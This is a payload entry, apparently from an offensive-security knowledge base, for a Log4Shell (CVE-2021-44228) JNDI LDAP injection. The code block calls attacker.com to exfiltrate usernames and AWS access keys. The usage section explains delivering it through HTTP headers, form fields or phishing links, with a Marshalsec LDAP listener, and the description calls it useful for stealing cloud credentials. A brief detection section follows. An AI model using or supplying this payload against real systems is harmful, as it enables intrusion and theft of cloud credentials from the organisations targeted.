---
id: a3fb0db9-49ab-4d8e-b508-80e0b8b136ee
name: Log4Shell-LDAP-Exfiltration-Payload
type: code
language: text
verified: true
created_at: '2023-04-06T03:55:56.742801+00:00'
updated_at: '2023-04-06T03:55:56.746172+00:00'
platforms:
  - Java
tags:
  - log4shell
  - payload
  - exfiltration
validated: true
---

# Log4Shell-LDAP-Exfiltration-Payload

## Code

```text
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/

# AWS Access Key
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}
```

## Description

This is a JNDI LDAP payload for exploiting Log4Shell (CVE-2021-44228) to exfiltrate environment variables from a vulnerable Log4j application. When logged, it triggers an LDAP lookup to an attacker-controlled server, resolving and sending back variables like USER, USERNAME, AWS_ACCESS_KEY_ID, and AWS_SECRET_ACCESS_KEY. Useful for stealing cloud credentials during initial access or reconnaissance.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `attacker.com` | Attacker's domain or IP for LDAP server | `evil.com` |
| `1389` | Port of the LDAP server | `1389` |
| `${env:USER}` | Target's USER environment variable | `root` |
| `${env:USERNAME}` | Target's USERNAME environment variable | `admin` |
| `${env:AWS_ACCESS_KEY_ID}` | AWS access key ID variable | `AKIAIOSFODNN7EXAMPLE` |
| `${env:AWS_SECRET_ACCESS_KEY}` | AWS secret access key variable | `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` |

## Usage

Embed this payload in HTTP headers, form fields, or phishing links that trigger logging in a vulnerable Log4j app. First, start an LDAP server (e.g., with Marshalsec). After sending, check server logs for exfiltrated values. Can be chained with phishing for initial delivery.

## Detection

- WAF rules blocking JNDI strings like `${jndi:ldap:` in inputs.
- Log4j configuration audits for unpatched versions.
- Network monitoring for outbound LDAP to unusual domains/ports.
- EDR alerts on unexpected Java class resolutions or environment variable access in logs.

## Related

- [[procedures/Exfiltrate-Environment-Variables-via-Log4Shell]]
- [[tools/Marshalsec]]
